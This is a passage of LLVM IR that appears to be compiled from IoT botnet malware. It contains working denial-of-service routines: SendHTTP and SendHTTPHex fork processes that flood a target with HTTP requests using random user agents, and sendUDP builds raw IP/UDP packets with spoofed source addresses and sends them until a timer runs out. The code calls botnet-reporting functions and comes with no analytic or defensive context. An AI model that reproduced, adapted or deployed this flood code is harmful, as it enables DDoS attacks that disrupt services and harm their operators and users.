.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv33 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv33, 4
  br i1 %min.iters.check, label %.lr.ph16.preheader34, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph16.preheader
  %8 = zext i32 %addconv33 to i64
  %9 = and i32 %addconv33, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end27 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph16.preheader34, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi28 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load31 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load31 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi28
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !27

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx32 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx32, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge17.loopexit, label %.lr.ph16.preheader34

.lr.ph16.preheader34:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph16.preheader
  %.014.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph16.preheader ], [ %19, %middle.block ]
  %.0913.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph16.preheader ], [ %ind.end, %middle.block ]
  %.01012.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph16.preheader ], [ %ind.end27, %middle.block ]
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16.preheader34, %.lr.ph16
  %.014 = phi i64 [ %23, %.lr.ph16 ], [ %.014.ph, %.lr.ph16.preheader34 ]
  %.0913 = phi i32 [ %24, %.lr.ph16 ], [ %.0913.ph, %.lr.ph16.preheader34 ]
  %.01012 = phi i16* [ %20, %.lr.ph16 ], [ %.01012.ph, %.lr.ph16.preheader34 ]
  %20 = getelementptr inbounds i16, i16* %.01012, i64 1
  %21 = load i16, i16* %.01012, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.014
  %24 = add nsw i32 %.0913, -2
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %.lr.ph16, label %._crit_edge17.loopexit.loopexit, !llvm.loop !28

._crit_edge17.loopexit.loopexit:                  ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %._crit_edge17.loopexit.loopexit, %middle.block
  %.lcssa25 = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge17.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa25, %._crit_edge17.loopexit ]
  %27 = icmp eq i32 %.09.lcssa, 1
  br i1 %27, label %28, label %.preheader

; <label>:28:                                     ; preds = %._crit_edge17
  %29 = bitcast i16* %.010.lcssa to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = add i64 %31, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %28, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %32, %28 ]
  %33 = lshr i64 %.1.ph, 16
  %34 = icmp eq i64 %33, 0
  br i1 %34, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %35 = phi i64 [ %38, %.lr.ph ], [ %33, %.lr.ph.preheader ]
  %.111 = phi i64 [ %37, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %36 = and i64 %.111, 65535
  %37 = add nuw nsw i64 %36, %35
  %38 = lshr i64 %37, 16
  %39 = icmp eq i64 %38, 0
  br i1 %39, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %37, %._crit_edge.loopexit ]
  %40 = trunc i64 %.1.lcssa to i16
  %41 = xor i16 %40, -1
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = bitcast i32* %3 to <2 x i32>*
  %5 = load <2 x i32>, <2 x i32>* %4, align 4
  %6 = zext <2 x i32> %5 to <2 x i64>
  %7 = tail call zeroext i16 @htons(i16 zeroext 20) #15
  %8 = tail call noalias i8* @malloc(i64 44) #6
  %9 = bitcast i8* %8 to i16*
  %10 = bitcast i8* %8 to <2 x i64>*
  store <2 x i64> %6, <2 x i64>* %10, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %8, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %8, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %8, i64 18
  %11 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %7, i16* %11, align 1
  %12 = getelementptr inbounds i8, i8* %8, i64 24
  %13 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* %13, i64 20, i32 1, i1 false)
  %14 = tail call zeroext i16 @csum(i16* %9, i32 44)
  tail call void @free(i8* %8) #6
  ret i16 %14
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #7

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = tail call i64 @time(i64* null) #6
  %10 = zext i32 %4 to i64
  %11 = add i64 %9, %10
  %12 = icmp sgt i32 %5, 0
  br i1 %12, label %.lr.ph15, label %._crit_edge16

.lr.ph15:                                         ; preds = %6
  %13 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  br label %16

; <label>:14:                                     ; preds = %16
  %15 = icmp slt i32 %25, %5
  br i1 %15, label %16, label %._crit_edge16.loopexit

; <label>:16:                                     ; preds = %.lr.ph15, %14
  %.013 = phi i32 [ 0, %.lr.ph15 ], [ %25, %14 ]
  %17 = tail call i32 @rand() #6
  %18 = srem i32 %17, 36
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [36 x i8*], [36 x i8*]* @useragents, i64 0, i64 %19
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %13, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.104, i64 0, i64 0), i8* %0, i8* %3, i8* %1, i8* %21) #6
  %23 = tail call i32 @fork() #6
  %24 = icmp eq i32 %23, 0
  %25 = add nuw nsw i32 %.013, 1
  br i1 %24, label %14, label %.preheader

.preheader:                                       ; preds = %16
  %sext = shl i64 %11, 32
  %26 = ashr exact i64 %sext, 32
  %27 = tail call i64 @time(i64* null) #6
  %28 = icmp sgt i64 %26, %27
  br i1 %28, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %29 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %30

; <label>:30:                                     ; preds = %.lr.ph, %.backedge
  %31 = tail call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %.backedge, label %33

; <label>:33:                                     ; preds = %30
  %34 = call i64 @strlen(i8* nonnull %13) #14
  %35 = call i64 @write(i32 %31, i8* nonnull %13, i64 %34) #6
  %36 = call i64 @read(i32 %31, i8* nonnull %29, i64 1) #6
  %37 = tail call i32 @close(i32 %31) #6
  br label %.backedge

.backedge:                                        ; preds = %33, %30
  %38 = tail call i64 @time(i64* null) #6
  %39 = icmp sgt i64 %26, %38
  br i1 %39, label %30, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  tail call void @exit(i32 0) #16
  unreachable

._crit_edge16.loopexit:                           ; preds = %14
  br label %._crit_edge16

._crit_edge16:                                    ; preds = %._crit_edge16.loopexit, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #2

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #12

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPHex(i8*, i8*, i16 zeroext, i8* nocapture readnone, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = alloca [2048 x i8], align 16
  %10 = tail call i64 @time(i64* null) #6
  %11 = zext i32 %4 to i64
  %12 = add i64 %10, %11
  %13 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %13, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.105, i64 0, i64 0), i64 265, i32 1, i1 false)
  %14 = icmp sgt i32 %5, 0
  br i1 %14, label %.lr.ph14, label %._crit_edge15

.lr.ph14:                                         ; preds = %6
  %15 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  br label %18

; <label>:16:                                     ; preds = %18
  %17 = icmp slt i32 %27, %5
  br i1 %17, label %18, label %._crit_edge15.loopexit

; <label>:18:                                     ; preds = %.lr.ph14, %16
  %.012 = phi i32 [ 0, %.lr.ph14 ], [ %27, %16 ]
  %19 = call i32 @rand() #6
  %20 = srem i32 %19, 36
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [36 x i8*], [36 x i8*]* @useragents, i64 0, i64 %21
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %15, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.104, i64 0, i64 0), i8* %0, i8* nonnull %13, i8* %1, i8* %23) #6
  %25 = call i32 @fork() #6
  %26 = icmp eq i32 %25, 0
  %27 = add nuw nsw i32 %.012, 1
  br i1 %26, label %16, label %.preheader

.preheader:                                       ; preds = %18
  %sext = shl i64 %12, 32
  %28 = ashr exact i64 %sext, 32
  %29 = call i64 @time(i64* null) #6
  %30 = icmp sgt i64 %28, %29
  br i1 %30, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %31 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %32

; <label>:32:                                     ; preds = %.lr.ph, %.backedge
  %33 = call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %.backedge, label %35

; <label>:35:                                     ; preds = %32
  %36 = call i64 @strlen(i8* nonnull %15) #14
  %37 = call i64 @write(i32 %33, i8* nonnull %15, i64 %36) #6
  %38 = call i64 @read(i32 %33, i8* nonnull %31, i64 1) #6
  %39 = call i32 @close(i32 %33) #6
  br label %.backedge

.backedge:                                        ; preds = %35, %32
  %40 = call i64 @time(i64* null) #6
  %41 = icmp sgt i64 %28, %40
  br i1 %41, label %32, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  call void @exit(i32 0) #16
  unreachable

._crit_edge15.loopexit:                           ; preds = %16
  br label %._crit_edge15

._crit_edge15:                                    ; preds = %._crit_edge15.loopexit, %6
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #3 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #6
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = icmp eq i32 %1, 0
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %8
  %14 = tail call i32 @rand_cmwc()
  %15 = trunc i32 %14 to i16
  br label %19

; <label>:16:                                     ; preds = %8
  %17 = trunc i32 %1 to i16
  %18 = tail call zeroext i16 @htons(i16 zeroext %17) #15
  br label %19

; <label>:19:                                     ; preds = %16, %13
  %.sink = phi i16 [ %18, %16 ], [ %15, %13 ]
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 1
  store i16 %.sink, i16* %20, align 2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 2
  %22 = call i32 @getHost(i8* %0, %struct.in_addr* %21)
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %24, label %.loopexit

; <label>:24:                                     ; preds = %19
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 3, i64 0
  %26 = bitcast i8* %25 to i64*
  store i64 0, i64* %26, align 4
  %27 = icmp eq i32 %3, 32
  br i1 %27, label %28, label %73

; <label>:28:                                     ; preds = %24
  %29 = tail call i32 @socket(i32 2, i32 2, i32 17) #6
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %34

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* @KadenCommStock, align 4
  %33 = tail call i32 (i32, i8*, ...) @botnetPrint(i32 %32, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.106, i64 0, i64 0))
  br label %.loopexit

; <label>:34:                                     ; preds = %28
  %35 = add nsw i32 %4, 1
  %36 = sext i32 %35 to i64
  %37 = tail call noalias i8* @malloc(i64 %36) #6
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit, label %39

; <label>:39:                                     ; preds = %34
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %37, i8 0, i64 %36, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %37, i32 %4)
  %40 = tail call i64 @time(i64* null) #6
  %41 = zext i32 %2 to i64
  %42 = add i64 %40, %41
  %43 = sext i32 %4 to i64
  %44 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %sext71 = shl i64 %42, 32
  %45 = ashr exact i64 %sext71, 32
  %46 = mul nsw i32 %7, 1000
  br i1 %12, label %.outer.us.preheader, label %.outer.preheader

.outer.preheader:                                 ; preds = %39
  br label %.outer

.outer.us.preheader:                              ; preds = %39
  br label %.outer.us

.outer.us:                                        ; preds = %.outer.us.backedge, %.outer.us.preheader
  %.068.ph.us = phi i32 [ 0, %.outer.us.preheader ], [ %.068.ph.us.be, %.outer.us.backedge ]
  %.067.ph.us = phi i32 [ 0, %.outer.us.preheader ], [ %59, %.outer.us.backedge ]
  br label %51

; <label>:47:                                     ; preds = %.us-lcssa.us.us
  %48 = add i32 %.068.ph.us, 1
  br label %.outer.us.backedge

; <label>:49:                                     ; preds = %.us-lcssa.us.us
  %50 = call i32 @usleep(i32 %46) #6
  br label %.outer.us.backedge

.outer.us.backedge:                               ; preds = %49, %47
  %.068.ph.us.be = phi i32 [ %48, %47 ], [ 0, %49 ]
  br label %.outer.us

; <label>:51:                                     ; preds = %.outer.us, %54
  %.067.us.us = phi i32 [ 0, %54 ], [ %.067.ph.us, %.outer.us ]
  %52 = call i64 @sendto(i32 %29, i8* nonnull %37, i64 %43, i32 0, %struct.sockaddr* nonnull %44, i32 16) #6
  %53 = icmp eq i32 %.067.us.us, %5
  br i1 %53, label %54, label %.us-lcssa.us.us

; <label>:54:                                     ; preds = %51
  %55 = call i32 @rand_cmwc()
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %20, align 2
  %57 = call i64 @time(i64* null) #6
  %58 = icmp sgt i64 %57, %45
  br i1 %58, label %.loopexit.loopexit, label %51

.us-lcssa.us.us:                                  ; preds = %51
  %59 = add i32 %.067.us.us, 1
  %60 = icmp eq i32 %.068.ph.us, %6
  br i1 %60, label %49, label %47

.outer:                                           ; preds = %.outer.backedge, %.outer.preheader
  %.068.ph = phi i32 [ 0, %.outer.preheader ], [ %.068.ph.be, %.outer.backedge ]
  %.067.ph = phi i32 [ 0, %.outer.preheader ], [ %67, %.outer.backedge ]
  br label %61

; <label>:61:                                     ; preds = %.outer, %64
  %.067 = phi i32 [ 0, %64 ], [ %.067.ph, %.outer ]
  %62 = call i64 @sendto(i32 %29, i8* nonnull %37, i64 %43, i32 0, %struct.sockaddr* nonnull %44, i32 16) #6
  %63 = icmp eq i32 %.067, %5
  br i1 %63, label %64, label %.us-lcssa

; <label>:64:                                     ; preds = %61
  %65 = call i64 @time(i64* null) #6
  %66 = icmp sgt i64 %65, %45
  br i1 %66, label %.loopexit.loopexit105, label %61

.us-lcssa:                                        ; preds = %61
  %67 = add i32 %.067, 1
  %68 = icmp eq i32 %.068.ph, %6
  br i1 %68, label %69, label %71

; <label>:69:                                     ; preds = %.us-lcssa
  %70 = call i32 @usleep(i32 %46) #6
  br label %.outer.backedge

.outer.backedge:                                  ; preds = %69, %71
  %.068.ph.be = phi i32 [ %72, %71 ], [ 0, %69 ]
  br label %.outer

; <label>:71:                                     ; preds = %.us-lcssa
  %72 = add i32 %.068.ph, 1
  br label %.outer.backedge

; <label>:73:                                     ; preds = %24
  %74 = tail call i32 @socket(i32 2, i32 3, i32 17) #6
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %76, label %79

; <label>:76:                                     ; preds = %73
  %77 = load i32, i32* @KadenCommStock, align 4
  %78 = tail call i32 (i32, i8*, ...) @botnetPrint(i32 %77, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.106, i64 0, i64 0))
  br label %.loopexit

; <label>:79:                                     ; preds = %73
  store i32 1, i32* %10, align 4
  %80 = bitcast i32* %10 to i8*
  %81 = call i32 @setsockopt(i32 %74, i32 0, i32 3, i8* nonnull %80, i32 4) #6
  %82 = icmp slt i32 %81, 0
  br i1 %82, label %83, label %.preheader.preheader

.preheader.preheader:                             ; preds = %79
  br label %.preheader

; <label>:83:                                     ; preds = %79
  %84 = load i32, i32* @KadenCommStock, align 4
  %85 = call i32 (i32, i8*, ...) @botnetPrint(i32 %84, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.107, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.06986 = phi i32 [ %86, %.preheader ], [ 50, %.preheader.preheader ]
  %86 = add nsw i32 %.06986, -1
  %87 = call i64 @time(i64* null) #6
  %88 = call i32 @rand_cmwc()
  %89 = zext i32 %88 to i64
  %90 = xor i64 %89, %87
  %91 = trunc i64 %90 to i32
  call void @srand(i32 %91) #6
  %92 = call i32 @rand() #6
  call void @init_rand(i32 %92)
  %93 = icmp eq i32 %86, 0
  br i1 %93, label %94, label %.preheader

; <label>:94:                                     ; preds = %.preheader
  %95 = icmp eq i32 %3, 0
  %96 = sub nsw i32 32, %3
  %97 = shl i32 -1, %96
  %.070 = select i1 %95, i32 0, i32 %97
  %98 = sext i32 %4 to i64
  %99 = add nsw i64 %98, 28
  %100 = call i8* @llvm.stacksave()
  %101 = alloca i8, i64 %99, align 16
  %102 = bitcast i8* %101 to %struct.iphdr*
  %103 = getelementptr i8, i8* %101, i64 20
  %104 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i64 0, i32 0
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @GRIP(i32 %.070)
  %107 = call i32 @htonl(i32 %106) #15
  %108 = add nsw i64 %98, 8
  %109 = trunc i64 %108 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %102, i32 %105, i32 %107, i8 zeroext 17, i32 %109)
  %110 = trunc i64 %108 to i16
  %111 = call zeroext i16 @htons(i16 zeroext %110) #15
  %112 = getelementptr inbounds i8, i8* %101, i64 24
  %113 = bitcast i8* %112 to i16*
  store i16 %111, i16* %113, align 8
  %114 = call i32 @rand_cmwc()
  %115 = trunc i32 %114 to i16
  %116 = bitcast i8* %103 to i16*
  store i16 %115, i16* %116, align 4
  br i1 %12, label %117, label %119

; <label>:117:                                    ; preds = %94
  %118 = call i32 @rand_cmwc()
  br label %123

; <label>:119:                                    ; preds = %94
  %120 = trunc i32 %1 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #15
  %122 = zext i16 %121 to i32
  br label %123

; <label>:123:                                    ; preds = %119, %117
  %.pre-phi = phi i16 [ %120, %119 ], [ 0, %117 ]
  %124 = phi i32 [ %122, %119 ], [ %118, %117 ]
  %125 = trunc i32 %124 to i16
  %126 = getelementptr inbounds i8, i8* %101, i64 22
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = getelementptr inbounds i8, i8* %101, i64 26
  %129 = bitcast i8* %128 to i16*
  store i16 0, i16* %129, align 2
  %130 = getelementptr inbounds i8, i8* %101, i64 28
  call void @makeRandomStr(i8* %130, i32 %4)
  %131 = bitcast i8* %101 to i16*
  %132 = getelementptr inbounds i8, i8* %101, i64 2
  %133 = bitcast i8* %132 to i16*
  %134 = load i16, i16* %133, align 2
  %135 = zext i16 %134 to i32
  %136 = call zeroext i16 @csum(i16* nonnull %131, i32 %135)
  %137 = getelementptr inbounds i8, i8* %101, i64 10
  %138 = bitcast i8* %137 to i16*
  store i16 %136, i16* %138, align 2
  %139 = call i64 @time(i64* null) #6
  %140 = zext i32 %2 to i64
  %141 = add i64 %139, %140
  %142 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %143 = getelementptr inbounds i8, i8* %101, i64 4
  %144 = bitcast i8* %143 to i16*
  %145 = getelementptr inbounds i8, i8* %101, i64 12
  %146 = bitcast i8* %145 to i32*
  %sext = shl i64 %141, 32
  %147 = ashr exact i64 %sext, 32
  %148 = mul nsw i32 %7, 1000
  br i1 %12, label %.outer72.us.preheader, label %.outer72.preheader

.outer72.preheader:                               ; preds = %123
  br label %.outer72

.outer72.us.preheader:                            ; preds = %123
  br label %.outer72.us

.outer72.us:                                      ; preds = %.outer72.us.backedge, %.outer72.us.preheader
  %.066.ph.us = phi i32 [ 0, %.outer72.us.preheader ], [ %170, %.outer72.us.backedge ]
  %.0.ph.us = phi i32 [ 0, %.outer72.us.preheader ], [ %.0.ph.us.be, %.outer72.us.backedge ]
  br label %153

; <label>:149:                                    ; preds = %.us-lcssa79.us.us
  %150 = add i32 %.0.ph.us, 1
  br label %.outer72.us.backedge

; <label>:151:                                    ; preds = %.us-lcssa79.us.us
  %152 = call i32 @usleep(i32 %148) #6
  br label %.outer72.us.backedge

.outer72.us.backedge:                             ; preds = %151, %149
  %.0.ph.us.be = phi i32 [ 0, %151 ], [ %150, %149 ]
  br label %.outer72.us

; <label>:153:                                    ; preds = %.outer72.us, %167
  %.066.us.us = phi i32 [ 0, %167 ], [ %.066.ph.us, %.outer72.us ]
  %154 = call i64 @sendto(i32 %74, i8* nonnull %101, i64 %99, i32 0, %struct.sockaddr* nonnull %142, i32 16) #6
  %155 = call i32 @rand_cmwc()
  %156 = trunc i32 %155 to i16
  store i16 %156, i16* %116, align 4
  %157 = call i32 @rand_cmwc()
  %158 = trunc i32 %157 to i16
  store i16 %158, i16* %127, align 2
  %159 = call i32 @rand_cmwc()
  %160 = trunc i32 %159 to i16
  store i16 %160, i16* %144, align 4
  %161 = call i32 @GRIP(i32 %.070)
  %162 = call i32 @htonl(i32 %161) #15
  store i32 %162, i32* %146, align 4
  %163 = load i16, i16* %133, align 2
  %164 = zext i16 %163 to i32
  %165 = call zeroext i16 @csum(i16* nonnull %131, i32 %164)
  store i16 %165, i16* %138, align 2
  %166 = icmp eq i32 %.066.us.us, %5
  br i1 %166, label %167, label %.us-lcssa79.us.us

; <label>:167:                                    ; preds = %153
  %168 = call i64 @time(i64* null) #6
  %169 = icmp sgt i64 %168, %147
  br i1 %169, label %.us-lcssa80.us.loopexit, label %153

.us-lcssa79.us.us:                                ; preds = %153
  %170 = add i32 %.066.us.us, 1
  %171 = icmp eq i32 %.0.ph.us, %6
  br i1 %171, label %151, label %149

.outer72:                                         ; preds = %.outer72.backedge, %.outer72.preheader
  %.066.ph = phi i32 [ 0, %.outer72.preheader ], [ %188, %.outer72.backedge ]
  %.0.ph = phi i32 [ 0, %.outer72.preheader ], [ %.0.ph.be, %.outer72.backedge ]
  br label %172

; <label>:172:                                    ; preds = %.outer72, %185
  %.066 = phi i32 [ 0, %185 ], [ %.066.ph, %.outer72 ]
  %173 = call i64 @sendto(i32 %74, i8* nonnull %101, i64 %99, i32 0, %struct.sockaddr* nonnull %142, i32 16) #6
  %174 = call i32 @rand_cmwc()
  %175 = trunc i32 %174 to i16
  store i16 %175, i16* %116, align 4
  %176 = call zeroext i16 @htons(i16 zeroext %.pre-phi) #15
  store i16 %176, i16* %127, align 2
  %177 = call i32 @rand_cmwc()
  %178 = trunc i32 %177 to i16
  store i16 %178, i16* %144, align 4
  %179 = call i32 @GRIP(i32 %.070)
  %180 = call i32 @htonl(i32 %179) #15
  store i32 %180, i32* %146, align 4
  %181 = load i16, i16* %133, align 2
  %182 = zext i16 %181 to i32
  %183 = call zeroext i16 @csum(i16* nonnull %131, i32 %182)
  store i16 %183, i16* %138, align 2
  %184 = icmp eq i32 %.066, %5
  br i1 %184, label %185, label %.us-lcssa79

; <label>:185:                                    ; preds = %172
  %186 = call i64 @time(i64* null) #6
  %187 = icmp sgt i64 %186, %147
  br i1 %187, label %.us-lcssa80.us.loopexit106, label %172

.us-lcssa79:                                      ; preds = %172
  %188 = add i32 %.066, 1
  %189 = icmp eq i32 %.0.ph, %6
  br i1 %189, label %190, label %192

; <label>:190:                                    ; preds = %.us-lcssa79
